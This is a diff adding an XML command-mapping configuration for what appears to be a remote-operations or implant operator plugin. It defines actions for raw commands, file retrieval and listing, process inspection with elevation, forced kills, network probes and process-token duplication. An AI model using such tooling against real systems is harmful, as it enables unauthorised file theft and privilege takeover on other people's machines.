@@ -1,0 +1,506 @@
+<ExecutionMethod>
+	<TerminalPath>ddb.dsz.plugin.terminal.Terminal</TerminalPath>
+	<Action spawnTerminal="false">
+		<Key>raw</Key>
+		<Command>
+			<Argument>
+				<Requires>command</Requires>
+				<String>%command%</String>
+			</Argument>
+			<Argument>
+				<Forbids>command</Forbids>
+				<String>script _noop.dss</String>
+			</Argument>
+		</Command>
+		<Display>
+			<Argument>
+				<Requires>command</Requires>
+				<String>Raw:  %command%</String>
+			</Argument>
+			<Argument>
+				<Forbids>command</Forbids>
+				<String>No command was provided.</String>
+			</Argument>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>get</Key>
+		<Command>
+			<Prefix>script RequestHandler/FileRetrieve.dss -args "</Prefix>
+			<Argument>
+				<Requires>name</Requires>
+				<Requires>path</Requires>
+				<Forbids>fullpath</Forbids>
+				<String>-path \"\\"%path%\\"\" -mask \"\\"%name%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>name</Requires>
+				<Forbids>path</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>-mask \"\\"%name%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>path</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>-path \"\\"%path%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>fullpath</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>path</Forbids>
+				<String>-full \"\\"%fullpath%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>recursive</Requires>
+				<String>-recursive</String>
+			</Argument>
+			<Argument>
+				<Requires>max</Requires>
+				<String>-max %max%</String>
+			</Argument>
+			<Argument>
+				<Requires>offset</Requires>
+				<String>-offset %offset%</String>
+			</Argument>
+			<Argument>
+				<Requires>time</Requires>
+				<String>-time %time%</String>
+			</Argument>
+			<Argument>
+				<Requires>age</Requires>
+				<String>-age \"\\"%age%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>after</Requires>
+				<String>-after \"\\"%after%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>before</Requires>
+				<String>-before \"\\"%before%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>extra</Requires>
+				<String>-extra \"\\"%extra%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>minsize</Requires>
+				<String>-minsize \"\\"%minsize%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>maxsize</Requires>
+				<String>-maxsize \"\\"%maxsize%\\"\"</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Retrieve</Prefix>
+			<Argument>
+				<Requires>name</Requires>
+				<Requires>path</Requires>
+				<Forbids>fullpath</Forbids>
+				<String>%name% from %path%</String>
+			</Argument>
+			<Argument>
+				<Requires>name</Requires>
+				<Forbids>path</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>%name%</String>
+			</Argument>
+			<Argument>
+				<Requires>path</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>%path%</String>
+			</Argument>
+			<Argument>
+				<Requires>fullpath</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>path</Forbids>
+				<String>%fullpath%</String>
+			</Argument>
+		</Display>
+		<Scope>
+			<Argument>
+				<Requires>bytes</Requires>
+				<Forbids>recursive</Forbids>
+				<Forbids>children</Forbids>
+				<String>%bytes% bytes</String>
+			</Argument>
+			<Argument>
+				<Requires>bytes</Requires>
+				<Requires>recursive</Requires>
+				<Requires>children</Requires>
+				<String>%children% files, %bytes% bytes</String>
+			</Argument>
+			<Argument>
+				<Requires>recursive</Requires>
+				<Requires>children</Requires>
+				<Forbids>bytes</Forbids>
+				<String>%children% files</String>
+			</Argument>
+			<Argument>
+				<Requires>offset</Requires>
+				<String>bytes %offset% - End</String>
+			</Argument>
+			<Argument>
+				<Requires>time</Requires>
+				<String>Time Filtered</String>
+			</Argument>
+			<Argument>
+				<Requires>max</Requires>
+				<String>Num Limited</String>
+			</Argument>
+		</Scope>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>dir</Key>
+		<Command>
+			<Prefix>script RequestHandler/FileListing.dss -args "</Prefix>
+			<Argument>
+				<Requires>path</Requires>
+				<Requires>name</Requires>
+				<String>-path \"\\"%path%\\"\" -mask \"\\"%name%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>path</Requires>
+				<Forbids>name</Forbids>
+				<String>-path \"\\"%path%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>name</Requires>
+				<Forbids>path</Forbids>
+				<String>-mask \"\\"%name%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>recursive</Requires>
+				<String>-recursive</String>
+			</Argument>
+			<Argument>
+				<Requires>time</Requires>
+				<String>-time %time%</String>
+			</Argument>
+			<Argument>
+				<Requires>age</Requires>
+				<String>-age \"\\"%age%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>after</Requires>
+				<String>-after \"\\"%after%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>before</Requires>
+				<String>-before \"\\"%before%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>max</Requires>
+				<String>-max %max%</String>
+			</Argument>
+			<Argument>
+				<Requires>extra</Requires>
+				<String>-extra \"\\"%extra%\\"\"</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Directory listing </Prefix>
+			<Argument>
+				<Requires>path</Requires>
+				<Requires>name</Requires>
+				<String>of %path%/%name%</String>
+			</Argument>
+			<Argument>
+				<Requires>path</Requires>
+				<Forbids>name</Forbids>
+				<String>of %path%</String>
+			</Argument>
+			<Argument>
+				<Requires>name</Requires>
+				<Forbids>path</Forbids>
+				<String>of %name%</String>
+			</Argument>
+		</Display>
+		<Scope>
+			<Argument>
+				<Requires>recursive</Requires>
+				<String>Recursive</String>
+			</Argument>
+			<Argument>
+				<Forbids>recursive</Forbids>
+				<String>Flat</String>
+			</Argument>
+			<Argument>
+				<Requires>time</Requires>
+				<String>Time Filtered</String>
+			</Argument>
+			<Argument>
+				<Requires>max</Requires>
+				<String>Num Limited</String>
+			</Argument>
+		</Scope>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>strings</Key>
+		<Command>
+			<Prefix>script RequestHandler/FileStrings.dss -args "</Prefix>
+			<Prefix>strings</Prefix>
+			<Argument>
+				<Requires>name</Requires>
+				<Requires>path</Requires>
+				<Forbids>fullpath</Forbids>
+				<String>-path \"\\"%path%\\"\" -mask \"\\"%name%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>name</Requires>
+				<Forbids>path</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>-mask \"\\"%name%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>path</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>-path \"\\"%path%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>fullpath</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>path</Forbids>
+				<String>\"\\"%fullpath%\\"\"</String>
+			</Argument>
+			<Argument>
+				<Requires>recursive</Requires>
+				<String>-recursive</String>
+			</Argument>
+			<Argument>
+				<Requires>max</Requires>
+				<String>-max %max%</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Gets strings of</Prefix>
+			<Argument>
+				<Requires>name</Requires>
+				<Requires>path</Requires>
+				<Forbids>fullpath</Forbids>
+				<String>%path%/%name%</String>
+			</Argument>
+			<Argument>
+				<Requires>name</Requires>
+				<Forbids>path</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>%name%</String>
+			</Argument>
+			<Argument>
+				<Requires>path</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>fullpath</Forbids>
+				<String>%path%</String>
+			</Argument>
+			<Argument>
+				<Requires>fullpath</Requires>
+				<Forbids>name</Forbids>
+				<Forbids>path</Forbids>
+				<String>%fullpath%</String>
+			</Argument>
+		</Display>
+		<Scope>
+			<Argument>
+				<Requires>bytes</Requires>
+				<Forbids>recursive</Forbids>
+				<String>%bytes% bytes</String>
+			</Argument>
+			<Argument>
+				<Requires>bytes</Requires>
+				<Requires>recursive</Requires>
+				<Requires>children</Requires>
+				<String>%children% files, %bytes% bytes</String>
+			</Argument>
+			<Argument>
+				<Requires>recursive</Requires>
+				<Requires>children</Requires>
+				<Forbids>bytes</Forbids>
+				<String>%children% files</String>
+			</Argument>
+		</Scope>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>drives</Key>
+		<Command>
+			<Prefix>script RequestHandler/DrivesListing.dss -args "</Prefix>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Drive Listing</Prefix>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>processinfo</Key>
+		<Command>
+			<Prefix>script RequestHandler/ProcessInfo.dss -args "</Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<Forbids>elevate</Forbids>
+				<String>-id %id%</String>
+			</Argument>
+			<Argument>
+				<Requires>id</Requires>
+				<Requires>elevate</Requires>
+				<String>-id %id% -elevate</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Get ProcessInfo of</Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<Forbids>elevate</Forbids>
+				<String>#%id%</String>
+			</Argument>
+			<Argument>
+				<Requires>id</Requires>
+				<Requires>elevate</Requires>
+				<String>#%id% (Elevate if necessary)</String>
+			</Argument>
+			<Argument>
+				<Forbids>id</Forbids>
+				<String>unknown process</String>
+			</Argument>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>processoptions</Key>
+		<Command>
+			<Prefix>script RequestHandler/ProcessOptions.dss -args "</Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<String>-id %id% -query</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Get ProcessOptions of</Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<String>#%id%</String>
+			</Argument>
+			<Argument>
+				<Forbids>id</Forbids>
+				<String>unknown process</String>
+			</Argument>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>kill</Key>
+		<Command>
+			<Prefix>script RequestHandler/ProcessKill.dss -args "</Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<Forbids>force</Forbids>
+				<String>-id %id%</String>
+			</Argument>
+			<Argument>
+				<Requires>id</Requires>
+				<Requires>force</Requires>
+				<String>-id %id% -force</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Kill</Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<Forbids>force</Forbids>
+				<String> #%id% (Force)</String>
+			</Argument>
+			<Argument>
+				<Requires>id</Requires>
+				<Requires>force</Requires>
+				<String>#%id% at all costs</String>
+			</Argument>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>markProcess</Key>
+		<Command>
+			<Prefix>local script _AddToProcessDatabase.dss -args "</Prefix>
+			<Argument>
+				<Requires>name</Requires>
+				<Requires>type</Requires>
+				<Forbids>comment</Forbids>
+				<String>\"%name%\" \"\" \"%type%\"</String>
+			</Argument>
+			<Argument>
+				<Requires>name</Requires>
+				<Requires>type</Requires>
+				<Requires>comment</Requires>
+				<String>\"%name%\" \"%comment%\" \"%type%\"</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Mark</Prefix>
+			<Argument>
+				<Requires>name</Requires>
+				<Requires>type</Requires>
+				<String>%name% as %type%</String>
+			</Argument>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>ping</Key>
+		<Command>
+			<Prefix>ping </Prefix>
+			<Prefix>script RequestHandler/NetworkPing.dss -args "</Prefix>
+			<Argument>
+				<Requires>address</Requires>
+				<String>%address%</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>Ping </Prefix>
+			<Argument>
+				<Requires>address</Requires>
+				<String>%address%</String>
+			</Argument>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>traceroute</Key>
+		<Command>
+			<Prefix>script RequestHandler/NetworkTraceroute.dss -args "</Prefix>
+			<Argument>
+				<Requires>address</Requires>
+				<String>%address%</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>traceroute </Prefix>
+			<Argument>
+				<Requires>address</Requires>
+				<String>%address%</String>
+			</Argument>
+		</Display>
+	</Action>
+	<Action spawnTerminal="false">
+		<Key>duplicatetoken</Key>
+		<Command>
+			<Prefix>script RequestHandler/DuplicateToken.dss -args "</Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<String>-duplicate %id%</String>
+			</Argument>
+			<Postfix>"</Postfix>
+		</Command>
+		<Display>
+			<Prefix>DuplicateToken </Prefix>
+			<Argument>
+				<Requires>id</Requires>
+				<String>{process=%id%}</String>
+			</Argument>
+		</Display>
+	</Action>
+</ExecutionMethod>
